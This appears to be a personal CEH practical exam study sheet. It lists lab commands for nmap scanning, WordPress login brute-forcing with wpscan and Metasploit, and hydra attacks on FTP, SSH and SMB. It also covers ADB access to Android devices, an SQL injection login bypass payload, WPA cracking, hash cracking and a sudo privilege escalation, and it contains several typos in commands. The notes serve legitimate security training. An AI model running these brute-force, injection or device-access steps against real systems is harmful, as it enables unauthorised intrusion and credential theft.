nmap = https://www.geeksforgeeks.org/nmap-command-in-linux-with-examples/
wpscan = https://www.geeksforgeeks.org/wpscan-tool-in-kali-linux/
hydra = https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/


* Find ip address on linux and windows

linux - ifconfig
windows - ipconfig


* Which command allows you to manage user account on a Window computer?
  net user

* what is port of RDP
  3389
  nmap to find out service running on port 3000 for the following ip
  nmap -sV -p 3000 172.16.20.5

* OS running
  nmap -O 172.16.20.5

* wpscan - wordpress

wpscan -url http://dhabal.com
wpsscan -url https://dhabal.com -e u
Bruteforce username/password
wpscan --url http://dhabal.com --usename /Desktop/username.txt --password /Desktop/password.txt
wpscan --url http://dhabal.com -u root --password /Desktop/password.txt

wpscan doesn't work in lab sometimem then use metspoit

* bruteforce users/password using metasploit

msfconsole

When Only user is provided.

use wordpress -> it will show all the modules of wordpress

use auxilliary/scanner/http/wordpress_login_enum
show options
set PASS_FILE /Desktop/password
set RHOST 10.10.1.10
set RPORT 8080
set TARGETURL http://http://10.10.1.10:8080
set USERNAME john
exploit

----------------------
msfconsole

* When Userlist and pwd list is provided

use wordpress -> it will show all the modules of wordpress

use auxilliary/scanner/http/wordpress_login_enum
show options
set URI /wordpress/wp-login.php
set USER_FILE /Desktop/users.txt
set PASS_FILE /Desktop/password.txt
set RHOST 10.10.1.10
run

* Bruteforce Using hydra

#FTP

hydra -L /Desktop/users.txt -p butterfly ftp://10.10.1.10 -V

#SSH

hydra -L /Desktop/users.txt -P /Desktop/password.txt 10.10.1.10 ssh
hydra -l admin -P /Desktop/password.txt 10.10.1.10 ssh
hydra -L /Desktop/users.txt -p butterfly 10.10.1.10 ssh

ftp 10.10.1.10
username:
password:

To get secret file from ftp server
get secret.txt

#SMB

hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb

use auxiliary/scanner/smb/smb_login
msf exploit (smb_login)>set rhosts 192.168.1.118
msf exploit (smb_login)>set user_file /root/Desktop/user.txt
msf exploit (smb_login)>set pass_file /root/Desktop/pass.txt
msf exploit (smb_login)>set stop_on_success true
msf exploit (smb_login)>exploit

* Hacking android

Android debug bridge (ADB) - exuce command on android using kali linux
ip has port open that is android device 5555

Question]On an android device there is a secrete code. What is inside the code?
You need to scan the subnet - look for a machine which has service running on port 5555 which is
nmap 10.0.0.49      -- host seems down
nmap -Pn 10.0.0.49  -- host is up, so scan with -Pn

nmap ip -sV -p 5555    (Scan for adb port)
adb connect [ip android device] -> show error port is missing
adb connect [ip andorid device]:5555  -> connected
adb shell
#ls  -> all dir
#cd sdcard/
#ls - look for file

Question John eng - suspected -android device
* Stegnography

Openstego - image
snow - file

[Windows]
Hide sensitive data in image
Message File section. select secret.txt -> contains sensitive info
Cover File. Select Desktop\Stego.bmp -> Open [After stegnography, the message file will be hidden in the designated cover file]
Click Hide Data button-> success message.

	Extract hidden info from image
	Extract data -> Input Stego file -> Desktop\Stego.bmp -> Open
	Output folder -> Desktop -> Open
	Click Extract Data button

* Cryptography

Question
File in documents - xyz - generate md5 hash for the file

Veracrypt
Find the secrete code from the encrypted drive - in encrypted drive you have encrypted folder - it has secret you need to get that code
Mount that file and find the secrete fin from the drive using veracrypt

Crack Hashes -
File secret.txt - it has secret content, find out its content.
https://hashes.com/en/decrypt/hash
https://crackstation.net

* BCTextEncoder

Find secret file which has been decoded - password to decode it.
Employee - n/w compnay - data breach in compny - ip of attacker - it in encode form - you want to know what is attackers ip, copy the encoded ip in BCText encoded and decode it, password is given.

* Cryptool

1. RC4
   Decrypt the file - RC4/Triple DES

DES(ECB)
2. DES ECB encryption - decrypt it.
   Login into ftp server with usernaem and password is encrypted
- u need to decrypt the password with algo using Cryptool and then login to ftp server
  ftp [ip]
  username
  password

ls
get filename

* SQl injection

User ketty - email-id/secret information

www.moviescope.com
sam/test  - its not given

This would work
user:abc' or 1=1--
password:test

View Profile
id=1
IDOR vuln exploit -> id=2

SQL injection - what is the method for sql injection get/post

* Wireshark

1. pcap file for dos - identify attacking ip
2. pcap file for ddos - identify total attacking machine
3. pcap file for login credentials - username and password

Statistics -> IPV4 source and destination
tcp.flags.syn == 1 and tcp.flags.ack == 0
tcp.flags.syn == 1

* CEH V12 Update

FQDN
Wi-fi pwd cracking
SMB pwd cracking
Detect & Analyse IoT traffic wireshark
Image stegnography
Command injection
SQLMap
Privilege escalation

FQDN for domain controller
server which manages security policies, central role in directory service.
storing and managing group policies and other n/w

Domain controller - user account, policies, group
LDAP - used for accessing directory info user accounts within n/w. Protocal of accessign ain maintaining user account within a n/w
Managing user account, authentication, access control in n/w

* FQDN

nmap -p 389 -sV -iL ip.txt  -> ip with 389 open will show [ldap port = 389]
OR
nmap -p 389 -sV ip -Pn -> this confirms
Host+Domain = FQDN
Host: DC
Domain: pentester.team

FQDN = DC.pentester.team

OR try
nmap -A “ip”
“nmap —script smb-os-discovery ‘ip’ “

* Hacking wifi n/w 

How to find BSSID?
Open pcap file & get BSSID first

aircrack-ng [pcap_file] (WEP network)
aircrack-ng -a2 -b [Target_BSSID] -w [password_list.txt] [WPA_CAP_FILE] (WPA2 or other n/w)

aircrack-ng -w password_list.txt pcap_file

* Android hacking 

Insider attack on subnet 192.168.0.0/24 of the employees mobile device. Covertly access the uses device and obtain 
malicious elf files stored in a folder 'Scan' Perform Deep scan on the elf files and obtain the last 4 digits of SHA 384 
hash of the file with highest entropy value.

Mobile is an android device so look for port 5555 in a network it will give u ip of device

sudo su
nmap -p 5555 -Pn 192.168.0.0  -> 192.168.0.25 [ip with adb running]
abd connect 192.168.0.25:4444
adb shell -> List of folders
ls
look for scan folder
adb pull /sdcard/scan
pwd
exit
/sdcard/scan folder content will be copied
now analyse elf file for high entropy

ent -h
apt install ent  - tool for entropy

ent evil.elf - 3.2 [entropy value]
ent evil2.elf  2.4
ent evil3.elf - 1.6

evil.elf has highest entropy.

sha384sum --help		[calculate sha384 hash]
sha384sum evil.elf		[Get last 4 digits]

* Privilege escalation 

N/w - 192.168.0.0/24 - User & password, Find the machine in the n/w and perform PE to root user and enter the content of root.txt file

1. nmap -sV -p 22 192.168.0.0/24    [SSH]  -> 192.168.0.1
2. ssh kali@192.168.0.1 				   -> connect via ssh
   password
3. sudo -l    							   -> show list of command we can run
4. sudo -i						           
   enter password 						   -> escalated privilege
5. whoami
6. cd /
7. find . -name root.txt
8. cat /home/kali/Documents/root.txt

* CVE & CVSS

   Scan the machine - 192.168.42.1 & identify Severity score of Vul that had EOL dev lang
   nvd.nist.gov
   EOL

nmap -Pn --script vuln 192.168.42.1
- list CVE, get CVE listed and find its vul score on nvd database

** RAT ** 
  Subnet - 192.136.x.x/24 on Windows, RAT is installed in the machine for remote admin purpose, retrieve a secret file from it.
  nmap -sV -sn 192.168.x.x/24

1. Find machine (Windows machine, RAT - njRAT, MoSucker, ProRAT, Theef, HTTP RAT)
2. Is there a active connection?

- machine which is running RAT
  
* Practice

1. OS of the machine hosting db

nmap -sV 172.16.0.0/24
-> 3306 - IP MYSQL port open
nmap -O [IP]		-> O.S
OR
nmap -sA 172.16.0.0/24

2. Find suspicious account on the target machine [IP]

RDC [IP]
test
password

cmd>net user

3. RDP open on machine
  nmap -p 3389 [subnet]
  OR
  nmap -Pn -p -sV 3389 IP (need to scan for all ip's )

4. Retrieve file from FTP server by decrypting ftp server credentials encrypted with DES algo, User:hacker

5. Cryptool -> to get the credentials

ftp IP
username
pwd

get secret.txt

6. Concealed info in text file

SNOW
snow.exe -C -p "magic" hide.txt

7. Identify credentials of the user from wordpress site
  wpscan --url http://x.x.x.x:8080/CEH -u <user> -P ~/wordlists/password.txt

msfconsole

Bruteforce users/password using metasploit
msfconsole

use wordpress -> it will show all the modules of wordpress

use auxilliary/scanner/http/wordpress_login_enum
show options
set PASS_FILE /Desktop/password
set RHOST 10.10.1.10
set RPORT 8080
set TARGETURL http://http://10.10.1.10:8080/CEH
set USERNAME john
exploit

8. Decrypt the hash
  hashes.com
  https://crackstation.net

9. Use a backdoor installed on a victim machine to get secret.txt, its a windows machine
- RDC
- browse to location and get contents of secret.txt

10. DOS attack pcap file, identify ip of attackers machine

11. Crack FTP credentials hosted on a site, and obtain the file flag.txt
  nmap -p 21 IP/Subnet
  nmap -p 21 IP
  ftp IP

  hydra -L /Username.txt -P /Password.txt ftp://10.10.10.10
  hydra -l user -P passlist.txt ftp://10.10.10.10
  hydra -l user -P passlist.txt ftp://10.10.10.10

  ftp
  credentials
  get flag.txt

12. Find backup file stored in Remote machine. Computer name: Server 2019

13. Find a machine which running Server 2019 service
  nmap -sV [subnet]

  RDP with credentials
  Look for backup file+

14. Website has SQL DSSS attack vulnerability, find out the user contact no.

You can use SQL map if DSSS is specified otherwise do manually by performing following steps
OR
- Bypass authentication with SQL injection
- IDOR to get users contact no

15. find credentials in pcap file

http.request.method==POST (you will get all the post request)
Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.

16. SQL injection on website, use ZAP tool to identify the HTTP method poses higest risk to the website
- scan site for SQL injection - look for method

17. How many hosts are up
  nmap -sn x.x.x.0/24 -iL ips.txt   { No of hosts up}

18. Decrypt the file content using veracrypt

19. Decrypt using cryptool, key = 14

20. Retrieve an information from an android device stored in sdcard, provide numeric info present in file
  Look for machine which has 5555
  use ADB

21. Decode encoded file
  Can use BCTextEncoder
